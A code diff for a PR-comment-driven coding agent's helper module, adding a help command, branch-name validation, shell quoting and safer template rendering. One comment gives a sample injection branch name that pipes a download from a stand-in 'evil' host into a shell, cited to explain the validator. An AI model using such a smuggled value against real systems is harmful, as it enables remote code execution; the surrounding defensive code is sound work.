@@ -1,19 +1,48 @@
 // Pure functions with no I/O, split out so the test suite can exercise the tricky decision logic
 // (command parsing, completion detection, output stabilisation) without touching Orca or GitHub.
 
-export type Command = { type: "stop" } | { type: "prompt"; prompt: string } | null;
+export type Command = { type: "stop" } | { type: "help" } | { type: "prompt"; prompt: string } | null;
 
 // GitHub Actions forwards the raw PR comment body. A valid command is "/orca" at the very start
 // of the (trimmed) comment, followed by either nothing, or whitespace + the rest of the prompt.
 // "/orcaX" and "hello /orca" are not commands — the workflow filters these too, but the server
-// must not trust that and re-checks here.
+// must not trust that and re-checks here. Bare "/orca" asks for the usage text. "stop" also
+// accepts the ways people actually type it ("stop.", "Stop!", "stop please", "please stop") —
+// anything longer is a prompt, since "stop the dev server and rerun the tests" is real work.
 export function parseCommand(body: string): Command {
   const match = /^\/orca(?:\s+([\s\S]*))?$/.exec(body.trim());
   if (!match) return null;
   const rest = (match[1] ?? "").trim();
-  if (!rest) return null; // bare "/orca" — nothing to run
-  if (rest.toLowerCase() === "stop") return { type: "stop" };
+  if (!rest) return { type: "help" };
+  if (/^(?:please\s+)?stop(?:\s+please)?[\s.!]*$/i.test(rest)) return { type: "stop" };
   return { type: "prompt", prompt: rest };
+}
+
+// Posted as-is when someone comments a bare "/orca".
+export const USAGE =
+  "🐳 orca: how to use it\n\n" +
+  "- `/orca <what you want>` — the agent works on this PR's branch and replies here. Follow-ups keep the same session.\n" +
+  "- `/orca stop` — closes this PR's session once the current request finishes.\n\n" +
+  "Only new comments on the PR conversation count: edits and review comments are ignored.";
+
+// Branch names reach shell commands on the agent host (`git fetch origin <head>`), and git
+// accepts names like `x;curl${IFS}evil|sh`. Allow only the characters real branches here use,
+// minus the forms git itself rejects. Callers also shell-quote (see shq) — this is the gate.
+export function isSafeRef(ref: string): boolean {
+  return (
+    /^[A-Za-z0-9._\/-]+$/.test(ref) &&
+    !ref.startsWith("-") &&
+    !ref.startsWith("/") &&
+    !ref.endsWith("/") &&
+    !ref.endsWith(".lock") &&
+    !ref.includes("..") &&
+    !ref.includes("//")
+  );
+}
+
+// Single-quotes a value for a POSIX shell command line.
+export function shq(value: string): string {
+  return `'${value.replace(/'/g, `'\\''`)}'`;
 }
 
 export type RunOutcome = "pending" | "done" | "error";
@@ -82,8 +111,9 @@ export function isNotionUrl(url: string): boolean {
 // Renders a task's prompt (authored in Notion, passed through by n8n as `prompt` — see
 // server.ts's POST /tasks) against the session's own values, replacing `{{branch}}`, `{{wo}}`,
 // `{{title}}`, `{{notion_url}}`, `{{repo_app}}`. An unrecognised `{{...}}` is left untouched
-// rather than blanked, so a typo in the Notion prompt fails loudly instead of silently vanishing;
+// rather than blanked, so a typo in the Notion prompt fails loudly instead of silently vanishing
+// (own keys only — `{{constructor}}` must not resolve to Object.prototype's);
 // a template with no placeholders at all is returned unchanged.
 export function renderPrompt(template: string, vars: Record<string, string>): string {
-  return template.replace(/\{\{(\w+)\}\}/g, (match, key) => (key in vars ? vars[key] : match));
+  return template.replace(/\{\{(\w+)\}\}/g, (match, key) => (Object.hasOwn(vars, key) ? vars[key] : match));
 }
